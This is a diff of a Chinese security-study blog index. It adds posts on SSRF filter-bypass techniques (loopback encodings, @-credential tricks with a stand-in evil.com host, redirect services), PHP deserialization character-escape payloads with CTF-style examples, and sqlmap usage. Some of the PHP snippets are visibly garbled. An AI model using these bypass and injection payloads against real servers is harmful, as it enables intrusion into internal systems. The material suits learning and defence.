@@ -152,6 +152,150 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2021/06/19/SSRF/">
+                SSRF
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2021-06-19</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>@<a href="SSRF">TOC</a></p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p> SSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。 </p>
+<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p> SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。 例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF漏洞可以利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器</p>
+<h1 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h1><p>攻击者想要访问主机B上的服务，但是由于存在防火墙或者主机B是属于内网主机等原因导致攻击者无法直接访问主机B。而服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，从而获取主机B的一些信息。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210617095831518.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h1><p>1、对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。</p>
+<p>2、攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。</p>
+<p>3、对内网Web应用进行指纹识别，识别企业内部的资产信息。</p>
+<p>4、击内外网的Web应用，主要是使用HTTP GET/POST请求就可以实现的攻击，（比如Struts2漏洞利用，SQL注入等）<br>5、利用file协议读取服务器本地文件等。</p>
+<h1 id="SSRF的限制："><a href="#SSRF的限制：" class="headerlink" title="SSRF的限制："></a>SSRF的限制：</h1><p>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。</p>
+<p>限制域名只能为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a></p>
+<p>限制不能访问内网的IP，以防止对内网进行攻击。</p>
+<p>屏蔽返回的详细信息。</p>
+<p>禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp://等引起的问题。</p>
+<h1 id="SSRF漏洞绕过方法："><a href="#SSRF漏洞绕过方法：" class="headerlink" title="SSRF漏洞绕过方法："></a>SSRF漏洞绕过方法：</h1><p>1.@　　　　　　　　　　<a target="_blank" rel="noopener" href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></p>
+<p>2.添加端口号　　　　　　<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p>
+<p>3.短地址　　　　　　　　<a target="_blank" rel="noopener" href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a></p>
+<p>4.可以指向任意ip的域名　 xip.io</p>
+<p>5.ip地址转换成进制来访问 192.168.0.1=32322</p>
+<p>扩展起来 讲一下</p>
+<h3 id="利用HTTP基本身份认证的方式绕过"><a href="#利用HTTP基本身份认证的方式绕过" class="headerlink" title="利用HTTP基本身份认证的方式绕过"></a>利用HTTP基本身份认证的方式绕过</h3><p>如果目标代码限制访问的域名只能为 <a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a>，那么我们可以采用HTTP基本身份认证的方式绕过。即 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@:[http://www.xxx.com@www.evil.com](http://www.evil.com/)</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用302跳转绕过内网IP"><a href="#利用302跳转绕过内网IP" class="headerlink" title="利用302跳转绕过内网IP"></a>利用302跳转绕过内网IP</h2><p>绕过对内网ip的限制我们可以利用302跳转的方法，有以下两种。</p>
+<p>（1）网络上存在一个很神奇的服务，网址为 <a target="_blank" rel="noopener" href="http://xip.io,当访问这个服务的任意子域名的时候,都会重定向到这个子域名/">http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名</a></p>
+<p>举个例子：</p>
+<p>当我们访问：<a target="_blank" rel="noopener" href="http://127.0.0.1.xip.io/flag.php%E6%97%B6%EF%BC%8C%E5%AE%9E%E9%99%85%E8%AE%BF%E9%97%AE%E7%9A%84%E6%98%AFhttp://127.0.0.1/1.php%E3%80%82">http://127.0.0.1.xip.io/flag.php时，实际访问的是http://127.0.0.1/1.php。</a></p>
+<p>像这种网址还有<a target="_blank" rel="noopener" href="http://nip.io,http//sslip.io">http://nip.io，http://sslip.io</a></p>
+<p> （2）短地址跳转绕过，</p>
+<h2 id="进制的转换绕过内网IP"><a href="#进制的转换绕过内网IP" class="headerlink" title="进制的转换绕过内网IP"></a>进制的转换绕过内网IP</h2><p>可以使用一些不同的进制替代ip地址，从而绕过WAF</p>
+<p>这里贴一个php脚本可以一键转换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ip = &#x27;127.0.0.1&#x27;;</span><br><span class="line">$ip = explode(&#x27;.&#x27;,$ip);</span><br><span class="line">$r = ($ip[0] &lt;&lt; 24) | ($ip[1] &lt;&lt; 16) | ($ip[2] &lt;&lt; 8) | $ip[3] ;</span><br><span class="line">if($r &lt; 0) &#123;</span><br><span class="line">$r += 4294967296;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;十进制:&quot;;     </span><br><span class="line">echo $r;</span><br><span class="line">echo &quot;八进制:&quot;;    </span><br><span class="line">echo decoct($r);</span><br><span class="line">echo &quot;十六进制:&quot;;  </span><br><span class="line">echo dechex($r);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="其他各种指向127-0-0-1的地址"><a href="#其他各种指向127-0-0-1的地址" class="headerlink" title="其他各种指向127.0.0.1的地址"></a>其他各种指向127.0.0.1的地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/       # localhost就是代指127.0.0.1</span><br><span class="line">http://0/               # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1</span><br><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行</span><br><span class="line">http://[::]:80/           # 在liunx下可用，window测试了下不行</span><br><span class="line">http://127。0。0。1/       # 用中文句号绕过</span><br><span class="line">http://①②⑦.⓪.⓪.①</span><br><span class="line">http://127.1/</span><br><span class="line">http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；</p>
+<p>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；</p>
+<p>最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2021/06/19/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/">
+                反序列化字符逃逸
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2021-06-19</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>@<a href="%E8%BF%99%E9%87%8C%E5%86%99%E7%9B%AE%E5%BD%95%E6%A0%87%E9%A2%98">TOC</a></p>
+<h2 id="反序列化特点"><a href="#反序列化特点" class="headerlink" title="反序列化特点"></a>反序列化特点</h2><p>1、php在反序列化时，底层代码是以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾，并且是根据长度判断内容的，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化规则才能成功。例如：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    public $name=<span class="string">&#x27;shy&#x27;</span>;</span><br><span class="line">    public $pass=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lemon = <span class="keyword">new</span> A();</span><br><span class="line">echo serialize($lemon);</span><br><span class="line">#反序列化后的结果为:</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;<span class="attr">s</span>:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;shy&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>2、在反序列化过程中长度不对应会报错<br>在反序列化的时候php会根据s所指定的字符长度去读取后边的字符。如果指定的长度错误则反序列化就会失败。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str=<span class="string">&#x27;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;shy&quot;;s:4:&quot;passs&quot;;s:6:&quot;123456&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize($str));</span><br></pre></td></tr></table></figure>
+<p>结果是bool(false)报错<br>3、可以反序列化类中不存在的元素</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">public $name = <span class="string">&#x27;purplet&#x27;</span>;</span><br><span class="line">public $age = <span class="string">&#x27;20&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$b=<span class="string">&#x27;O:4:&quot;user&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;purplet&quot;;</span></span><br><span class="line"><span class="string">s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:6:&quot;gender&quot;;s:3:&quot;boy&quot;;&#125;&#x27;</span>;</span><br><span class="line">print_r(unserialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>最后结果会出现gender,值为boy。</p>
+<h2 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h2><p>一、<strong>本质：闭合</strong><br>二、分为两种情况：1、字符变多；2、字符变少。<br>三、字符变多举例</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">filter</span> (<span class="params">$string</span>) </span>&#123;</span><br><span class="line">$filter =.<span class="string">&#x27;/p/i &#x27;</span> ;</span><br><span class="line"><span class="keyword">return</span> preg replace ($filter, <span class="string">&#x27;WW&#x27;</span>,$str)</span><br><span class="line">&#125;</span><br><span class="line">$username · =. <span class="string">&#x27;purplet&#x27;</span>; #pppppppppppppppp<span class="string">&quot;;</span></span><br><span class="line"><span class="string">$age· =. &quot;</span><span class="number">10</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">$user· =·array ($username,$age) ;</span></span><br><span class="line"><span class="string">var dump (serialize ($user));</span></span><br><span class="line"><span class="string">echo &quot;</span>&lt;pre&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">$r = filter (serialize($user));var_dump ($r);</span></span><br><span class="line"><span class="string">Lvar dump(unserialize ($r));</span></span><br></pre></td></tr></table></figure>
+<p>这里是一个p换成两个w，结果会报错<br><img src="https://img-blog.csdnimg.cn/20210610161157315.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时候我要改变age的值，就需要利用反序列化字符逃逸，用16个p填充user，然后在后面加上”;i:1;s:2:”20”;}</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	<span class="comment">//过滤函数</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$filter = <span class="string">&#x27;/p/i&#x27;</span>;</span><br><span class="line">		<span class="comment">//正则匹配，表示变量string中的p（由filter决定）会被替换成WW</span></span><br><span class="line">		<span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;WW&#x27;</span>,$string);</span><br><span class="line">	&#125;</span><br><span class="line"> 	$username = <span class="string">&#x27;purplet&#x27;</span>;</span><br><span class="line"> 	$age = <span class="string">&quot;20&quot;</span>;</span><br><span class="line"> 	$user = array($username,$age);<span class="comment">//数组</span></span><br><span class="line"> 	<span class="comment">//序列化后的数值输出</span></span><br><span class="line">	var_dump(serialize($user));</span><br><span class="line">	echo <span class="string">&quot;&lt;pre&gt;&quot;</span>;<span class="comment">//分隔符</span></span><br><span class="line">	<span class="comment">//序列化过滤后的数值赋值给r并输出</span></span><br><span class="line">	$r = filter(serialize($user));</span><br><span class="line">	var_dump($r);</span><br><span class="line">	<span class="comment">//对 序列化过滤后的数值  反序列化</span></span><br><span class="line">	var_dump(unserialize($r));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>2、字符减少<br>与增多不同的是，不仅要构造username,还要构造age。<br>第一步：改变age的值，序列化后为<code>;i:1;s:2:&quot;20&quot;&#125;</code>,符，而此时uesrname的值无法确定，可随意构造<br>第二步：age处传递一个任意数值和双引号进行闭合，即再次传入age = A”;i:1;s:2:”20”;},查看结果<br>第三步：计算选中部分（长度为13）根据过滤后字符缩减情况构造，Demo中每两个p变为1个W，相当于逃逸1位（选中部分即为逃逸字符)所以输入13*2=26个p进行逃逸，即最终传递usernmae=pppppppppppppppppppppppppp,age=A”;i:1;s:2:”20”;}</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>题目代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error reporting(O);<span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">public $uname = <span class="string">&#x27;123&quot;;</span></span><br><span class="line"><span class="string">public $password = &#x27;</span>yu22x<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">function filter($string)&#123;</span></span><br><span class="line"><span class="string">return str replace(&#x27;</span>Firebasky<span class="string">&#x27;,&#x27;</span>Firebaskyed<span class="string">&#x27;&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$a = new a();</span></span><br><span class="line"><span class="string">var dump(serialize($a));</span></span><br><span class="line"><span class="string">echo &quot;&lt;pre&gt;&quot;;</span></span><br><span class="line"><span class="string">$r = filter(serialize($a));vardump($r);</span></span><br><span class="line"><span class="string">var dump(unserialize($r));</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此题要求以get的方式上传password为yussy，但是password无法修改</p>
+<p><img src="https://img-blog.csdnimg.cn/20210610170816968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210610170542714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2021/06/19/sqlmap/">
+                sqlmap
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2021-06-19</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>@<a href="sqlmap">TOC</a></p>
+<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p> sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。采用五种独特的SQL注入技术，分别是：</p>
+<p>   1）基于布尔的盲注，即可以根据返回页面判断条件真假的注入。<br>   2）基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。<br>   3）基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。<br>   4）联合查询注入，可以使用union的情况下的注入。<br>   5）堆查询注入，可以同时执行多条语句的执行时的注入。</p>
+<h2 id="sqlmap的安装"><a href="#sqlmap的安装" class="headerlink" title="sqlmap的安装"></a>sqlmap的安装</h2><p>sqlmap的安装需要python2x的环境，python下载的官网是<a target="_blank" rel="noopener" href="https://www.python.org/downloads/">https://www.python.org/downloads/</a><br><img src="https://img-blog.csdnimg.cn/20210606091011152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可在cmd中查看：<br><img src="https://img-blog.csdnimg.cn/20210606092009460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>，之后下载sqlmap的压缩包，然后解压到python的目录下 即可。sqlmap下载地址：<a target="_blank" rel="noopener" href="http://sqlmap.org/">http://sqlmap.org/</a><br><img src="https://img-blog.csdnimg.cn/20210606092046119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h2><p>一、<br>1、打开cmd<br>2、<img src="https://img-blog.csdnimg.cn/20210606094915301.png" alt="在这里插入图片描述"></p>
+<p>进入D盘<br>3、<img src="https://img-blog.csdnimg.cn/20210606095143527.png" alt="在这里插入图片描述"></p>
+<p>进入Python27文件<br>4、<img src="https://img-blog.csdnimg.cn/20210606095442775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 二、sqlmap直接连接数据库<br> 对于服务型数据库（前提是需要知道数据库的用户名和密码）<br> 例如：python sqlmap.py-d”mysql://admin:<a href="mailto:&#x61;&#100;&#109;&#105;&#110;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#50;&#49;&#x2e;&#x31;&#x37;">&#x61;&#100;&#109;&#105;&#110;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#50;&#49;&#x2e;&#x31;&#x37;</a>:3306/testdb”-f –banner –db –users<br> (bannner信息：欢迎语，在banner信息中可以得到软件开发商，软件名称、版本、服务类型等信息，通过这些信息可以使用某些工具直接去使用相对应的exp去攻击。)<br> sqlmap建议在kali上使用</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2021/06/04/%E6%B5%85%E8%B0%88XXE/">
                 浅谈XXE
             </a>
@@ -376,102 +520,6 @@
 
 </div>
             
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2021/05/19/docker/">
-                docker学习
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2021-05-19</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="学习目标：学习docker技术并对常用命令进行总结"><a href="#学习目标：学习docker技术并对常用命令进行总结" class="headerlink" title="学习目标：学习docker技术并对常用命令进行总结"></a>学习目标：学习docker技术并对常用命令进行总结</h1><h1 id="学习内容："><a href="#学习内容：" class="headerlink" title="学习内容："></a>学习内容：</h1><p>一、docker概述<br>docker 是一个开源的应用容器引擎,让开发者可以打包他们的应用以及依赖包到一个可移植的容器中,然后发布到任何流行的Linux机器上,也可以实现虚拟化,容器是完全使用沙箱机制,相互之间不会有任何接口<br><img src="https://img-blog.csdnimg.cn/20210128174927471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210131164446110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>二、Docker三大核心<br>docker有3大核心：镜像、容器、仓库<br><img src="https://img-blog.csdnimg.cn/20210131164720528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>鲸鱼是操作系统。<br>要交付的应用程序是各种货物，要将各种形状和尺寸不同的货物放到大鲸鱼上，得考虑每件货物怎么安放（应用程序配套的环境），还得考虑货物和货物之间能否重叠起来（应用程序依赖的环境是否会冲突）。<br>现在使用了集装箱（容器）把每件货物都放到集装箱里，这样大鲸鱼可以用同样地方式安放、堆叠集装了，省事省力。<br>即：打包放到鲸鱼上，鲸鱼放到服务器上。也就是“build——ship——run”，这样在自己的电脑上怎么运行，在服务器上也会怎么运行。<br>用docker运行一个程序的过程：<br>去仓库把镜像拉到本地，然后用一条命令把镜像运行起来，变成容器。</p>
-<p>三、docker常用命令总结<br>docker pull ${CONTAINER NAME}                    #拉取镜像<br>docker images                                    #查看本地所有镜像<br>docker ps                                        #查看所有正在运行的容器，加-q返回id<br>docker ps -a                                     #查看所有容器，加-q返回id<br>docker rmi ${IMAGE NAME/ID}                      #删除镜像<br>docker rm ${CONTAINER NAME/ID}                   #删除容器<br>docker save ${IMAGE NAME} &gt; ${FILE NAME}.tar     #将镜像保存成文件<br>docker load &lt; ${FILE NAME}.tar                   #从文件加载镜像<br>docker start ${CONTAINER NAME/ID}                #运行一个以前运行过的容器<br>docker stop ${CONTAINER NAME/ID}                 #停止一个正在运行的容器<br>docker logs ${CONTAINER NAME/ID}                 #显示运行容器的日志<br>docker run…                                    #运行一个容器<br>    –name ${container name}                          #设置容器名称<br>    -p ${host port}:${container port}                 #映射主机和容器内的端口<br>    -e ${env name}=${env value}                       #添加环境变量<br>    -d                                                #后台运行<br>    -v ${host folder path}:${container folder path}   #将主机目录挂在到容器内<br>三、docker高级命令总结<br>Advance use<br>docker ps -f “status=exited”                                   #显示所有退出的容器<br>docker ps -a -q                                                #显示所有容器id<br>docker ps -f “status=exited” -q                                #显示所有退出容器的id<br>docker restart $(docker ps -q)                                 #重启所有正在运行的容器<br>docker stop $(docker ps -a -q)                                 #停止所有容器<br>docker rm $(docker ps -a -q)                                   #删除所有容器<br>docker rm $(docker ps -f “status=exited” -q)                   #删除所有退出的容器<br>docker rm $(docker stop $(docker ps -a -q))                    #停止并删除所有容器<br>docker start $(docker ps -a -q)                                #启动所有容器<br>docker rmi $(docker images -a -q)                              #删除所有镜像<br>docker exec -it ${CONTAINER NAME/ID} /bin/bash                 #进入容器内<br>docker exec -it ${CONTAINER NAME/ID} ping ${CONTAINER NAME/ID} #一个容器ping另外一个容器<br>docker top ${CONTAINER NAME/ID}                                #显示一个容器的top信息<br>docker stats                                                   #显示容器统计信息(正在运行)<br>    docker stats -a                                            #显示所有容器的统计信息(包括没有运行的)<br>    docker stats -a –no-stream                                #显示所有容器的统计信息(包括没有运行的) ，只显示一次<br>    docker stats –no-stream | sort -k8 -h                     #统计容器信息并以使用流量作为倒序<br>docker system<br>      docker system df           #显示硬盘占用<br>      docker system events       #显示容器的实时事件<br>      docker system info         #显示系统信息<br>      docker system prune        #清理文件</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2021/05/19/sql-labs/">
-                sql相关知识
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2021-05-19</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h2 id="sqli-labs靶场及相关知识"><a href="#sqli-labs靶场及相关知识" class="headerlink" title="sqli-labs靶场及相关知识"></a>sqli-labs靶场及相关知识</h2><p><img src="https://img-blog.csdnimg.cn/20210203100511759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
